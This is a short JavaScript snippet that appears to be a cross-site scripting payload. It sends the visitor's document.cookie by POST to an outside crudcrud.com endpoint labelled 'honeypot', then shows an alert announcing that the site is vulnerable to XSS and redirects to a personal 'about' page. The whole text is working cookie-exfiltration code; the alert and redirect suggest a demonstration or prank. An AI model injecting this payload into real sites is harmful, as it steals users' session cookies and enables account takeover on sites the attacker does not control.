fetch("https://crudcrud.com/api/a2731775c20c4c2b96bc1b0a9eb5d434/honeypot", {
  method: "POST",
  body: JSON.stringify({
    cookie: document.cookie
  }),
  headers: {
    "Content-type": "application/json; charset=UTF-8"
  }
});

alert("This website is vulnerable to XSS, so unfortunate 🙂. Let's move to my website so that you have a better understanding of who I am 😌");
setTimeout(() => {
    window.location = "https://mattrighetti.com/about.html"
}, 1000);